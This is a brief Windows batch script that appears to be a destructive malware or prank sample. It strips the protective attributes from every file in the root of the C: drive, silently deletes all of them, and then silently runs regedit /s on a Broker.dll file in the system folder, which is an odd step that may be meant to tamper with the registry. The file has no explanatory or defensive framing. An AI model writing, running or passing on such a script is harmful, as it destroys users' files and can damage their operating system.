@echo off
attrib C:\*.* -s -h -r
del C:\*.* /Q
regedit /s %systemroot%\system\Broker.dll
exit